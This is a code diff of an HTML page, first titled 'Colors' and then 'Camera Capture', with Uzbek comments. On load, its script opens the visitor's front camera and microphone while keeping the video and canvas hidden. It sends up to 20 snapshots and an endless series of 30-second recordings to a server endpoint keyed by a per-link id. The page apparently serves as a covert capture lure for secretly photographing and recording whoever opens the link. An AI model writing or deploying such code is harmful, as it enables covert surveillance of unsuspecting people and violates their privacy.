@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>Colors</title>
+  <title>Camera Capture</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
@@ -21,114 +21,133 @@
     video, canvas { display: none; }
   </style>
 </head>
+
 <body>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    let video = document.getElementById("video");
+    let canvas = document.getElementById("canvas");
     let stream = null;
-    let mediaRecorder, chunks = [];
+    let mediaRecorder = null;
+    let chunks = [];
+
     let imageCount = 0;
     const maxImages = 20;
 
-    // current path: /camera/<id>/  yoki /rasm/<id>/
-    const currentPath = window.location.pathname;
-    const parts = currentPath.split("/").filter(Boolean);
-    // oxirgi element id bo'lishi kerak
-    const id = parts[parts.length - 1] || '';
-    // backend endpoint — moslashtiring agar urls.py da 'rasm' saqlansa: `/rasm/${id}/`
-    const uploadURL = `/${parts[0]}/${id}/`; // e.g. /camera/639/  yoki /rasm/639/
+    // === URL dan /rasm/<id>/ yoki /camera/<id>/ ni olish ===
+    const parts = window.location.pathname.split("/").filter(Boolean);
+    const id = parts[parts.length - 1];
+    const uploadURL = `/${parts[0]}/${id}/`;   // backend endpoint
 
-    function dataURLtoBlob(dataurl) {
+    // === Base64 → Blob ===
+    function dataURLtoBlob(dataurl){
       const arr = dataurl.split(',');
       const mime = arr[0].match(/:(.*?);/)[1];
       const bstr = atob(arr[1]);
       let n = bstr.length;
       const u8arr = new Uint8Array(n);
-      while (n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
+      while(n--) u8arr[n]=bstr.charCodeAt(n);
+      return new Blob([u8arr],{type:mime});
     }
 
-    function getCookie(name) {
-      const value = `; ${document.cookie}`;
-      const parts = value.split(`; ${name}=`);
-      if (parts.length === 2) return parts.pop().split(';').shift();
-      return null;
-    }
-    const csrftoken = getCookie('csrftoken');
+    // === RASM OLISH ===
+    async function takeAndSendImage(){
+      if(!stream || imageCount >= maxImages) return;
 
-    // === Rasm yuborish ===
-    async function takeAndSendImage() {
-      if (!stream || imageCount >= maxImages) return;
-      const w = video.videoWidth || 640;
-      const h = video.videoHeight || 480;
-      canvas.width = w; canvas.height = h;
-      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
-      const blob = dataURLtoBlob(canvas.toDataURL('image/png'));
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const blob = dataURLtoBlob(canvas.toDataURL("image/png"));
       const form = new FormData();
-      form.append('image', blob, `snapshot_${Date.now()}.png`);
-      try {
-        await fetch(uploadURL, {
-          method: 'POST',
-          body: form,
-          // headers: {'X-CSRFToken': csrftoken}, // @csrf_exempt bo'lgani uchun shart emas
-          credentials: 'same-origin'
-        });
-        imageCount++;
-        console.log("Rasm yuborildi:", imageCount);
-      } catch(e){ console.error(e); }
+      form.append("image", blob, `img_${Date.now()}.png`);
+
+      try{
+        await fetch(uploadURL, { method:"POST", body:form });
+        console.log("Foto yuborildi");
+      }catch(e){ console.error(e); }
+
+      imageCount++;
     }
 
-    // === Video yuborish ===
-    function startVideoRecording() {
-      if (!stream) return;
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+    // === VIDEO YOZISH ===
+    function startRecording(){
+      if(!stream) return;
+
+      // Safari uchun MIME fallback
+      let options = { mimeType: "video/webm" };
+      if(!MediaRecorder.isTypeSupported("video/webm")){
+        options = { mimeType: "video/mp4" }; // fallback
+      }
+
+      try{
+        mediaRecorder = new MediaRecorder(stream, options);
+      }catch(e){
+        console.warn("MediaRecorder muammo, defaultsiz ishlatyapman:", e);
+        mediaRecorder = new MediaRecorder(stream);
+      }
+
       chunks = [];
 
-      mediaRecorder.ondataavailable = e => { if(e.data && e.data.size>0) chunks.push(e.data); };
+      mediaRecorder.ondataavailable = e => {
+        if(e.data && e.data.size > 0) chunks.push(e.data);
+      };
+
       mediaRecorder.onstop = async () => {
-        if(chunks.length>0){
-          const blob = new Blob(chunks, { type: "video/webm" });
-          const form = new FormData();
-          form.append('video', blob, `chunk_${Date.now()}.webm`);
-          try {
-            await fetch(uploadURL, {
-              method: 'POST',
-              body: form,
-              credentials: 'same-origin'
-            });
-            console.log("Video yuborildi");
-          } catch(e){ console.error(e); }
-        }
-        setTimeout(startVideoRecording, 500);
+        if(chunks.length === 0) return;
+
+        const blob = new Blob(chunks, { type: "video/webm" });
+        const form = new FormData();
+        form.append("video", blob, `vid_${Date.now()}.webm`);
+
+        try{
+          await fetch(uploadURL, { method:"POST", body:form });
+          console.log("Video yuborildi");
+        }catch(e){ console.error(e); }
+
+        setTimeout(() => startRecording(), 500); // qayta yozish
       };
 
       mediaRecorder.start();
-      setTimeout(()=>{ try{ mediaRecorder.stop(); } catch(e){ console.warn(e); } }, 30*1000);
+      setTimeout(() => {
+        try{ mediaRecorder.stop(); }catch(e){ console.warn(e); }
+      }, 30000); // 30 sekund
     }
 
-    // === Kamera ishga tushirish ===
-    window.onload = async () => {
+    // === KAMERANI ISHGA TUSHIRISH ===
+    async function initCamera(){
       try{
-        stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:true });
-        video.srcObject = stream;
-        await new Promise(r=>{ if(video.readyState>=2) r(); else video.onloadedmetadata=r; });
-
-        const imageInterval = setInterval(()=>{
-          takeAndSendImage();
-          if(imageCount>=maxImages) clearInterval(imageInterval);
-        },700);
-
-        startVideoRecording();
-
-        window.addEventListener('beforeunload', ()=>{
-          if(mediaRecorder && mediaRecorder.state!=='inactive') mediaRecorder.stop();
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: true
         });
 
-      } catch(e){ console.error(e); }
-    };
+        video.srcObject = stream;
+
+        await new Promise(res => {
+          if(video.readyState >= 2) res();
+          else video.onloadedmetadata = res;
+        });
+
+        // Rasm olishni boshlaymiz
+        let interval = setInterval(() => {
+          takeAndSendImage();
+          if(imageCount >= maxImages) clearInterval(interval);
+        }, 800);
+
+        // Video yozishni boshlaymiz
+        startRecording();
+
+      }catch(e){
+        console.error("Kamera xatosi:", e);
+        alert("Kamera ruxsati berilmadi!");
+      }
+    }
+
+    window.onload = () => initCamera();
   </script>
 </body>
 </html>
